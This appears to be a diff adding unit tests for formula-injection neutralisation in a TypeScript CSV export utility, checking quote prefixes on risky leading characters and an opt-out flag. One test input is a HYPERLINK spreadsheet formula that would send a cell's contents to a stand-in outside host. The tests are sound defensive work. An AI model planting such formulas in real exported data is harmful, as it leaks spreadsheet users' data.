@@ -152,6 +152,57 @@ describe("toCsv — values", () => {
     });
 });
 
+describe("toCsv — formula injection (#446)", () => {
+    const column = [{ key: "v", header: "V" }] as { key: "v"; header: string }[];
+    const cell = (value: unknown, options: Parameters<typeof toCsv>[2] = {}): string =>
+        lines(toCsv([{ v: value }], column, options))[1] ?? "";
+
+    it.each([
+        ["=1+2", "'=1+2"],
+        ["+3+4", "'+3+4"],
+        ["-5+1", "'-5+1"],
+        ["@SUM(1+1)", "'@SUM(1+1)"],
+        ["\t=1+1", "'\t=1+1"],
+        ["-", "'-"],
+        ["-- nota", "'-- nota"],
+    ])("prefixes a quote to the string %j so a spreadsheet reads it as text", (raw, written) => {
+        expect(cell(raw)).toBe(written);
+    });
+
+    it("neutralizes and still quotes a formula that carries the delimiter and quotes", () => {
+        expect(cell('=HYPERLINK("http://x/?d="&A1,"x")')).toBe(
+            '"\'=HYPERLINK(""http://x/?d=""&A1,""x"")"',
+        );
+    });
+
+    it("neutralizes a field that starts with a carriage return", () => {
+        expect(cell("\r=1+1")).toBe('"\'\r=1+1"');
+    });
+
+    it("leaves a real negative number alone, typed or written as text", () => {
+        expect(cell(-5)).toBe("-5");
+        expect(cell(-1.5)).toBe("-1.5");
+        expect(cell(-2e-7)).toBe("-2e-7");
+        expect(cell("-5")).toBe("-5");
+        expect(cell("-1.234,56", { delimiter: ";" })).toBe("-1.234,56");
+        expect(cell("+42")).toBe("+42");
+    });
+
+    it("leaves an ordinary field and a formula character in the middle alone", () => {
+        expect(cell("a=b")).toBe("a=b");
+        expect(cell("ana@example.com")).toBe("ana@example.com");
+    });
+
+    it("neutralizes a header too, since column names can come from data", () => {
+        expect(lines(toCsv([], [{ key: "v", header: "=1+2" }]))[0]).toBe("'=1+2");
+    });
+
+    it("writes the field verbatim when neutralizeFormulas is false", () => {
+        expect(cell("=1+2", { neutralizeFormulas: false })).toBe("=1+2");
+        expect(cell("@x", { neutralizeFormulas: false })).toBe("@x");
+    });
+});
+
 describe("downloadCsv", () => {
     beforeEach(() => {
         shareOrDownloadBlob.mockReset();
@@ -178,5 +229,17 @@ describe("downloadCsv", () => {
         const text = await blob.text();
         expect(text.startsWith("\uFEFF")).toBe(false);
         expect(text).toContain("Nome;E-mail");
+    });
+
+    it("neutralizes formulas by default and forwards the opt-out", async () => {
+        const rows = [{ v: "=1+2" }];
+        const column = [{ key: "v", header: "V" }] as { key: "v"; header: string }[];
+        await downloadCsv(rows, column);
+        await downloadCsv(rows, column, "raw.csv", { neutralizeFormulas: false });
+        const [safe, raw] = await Promise.all(
+            shareOrDownloadBlob.mock.calls.map(([blob]) => (blob as Blob).text()),
+        );
+        expect(lines(safe ?? "")[1]).toBe("'=1+2");
+        expect(lines(raw ?? "")[1]).toBe("=1+2");
     });
 });
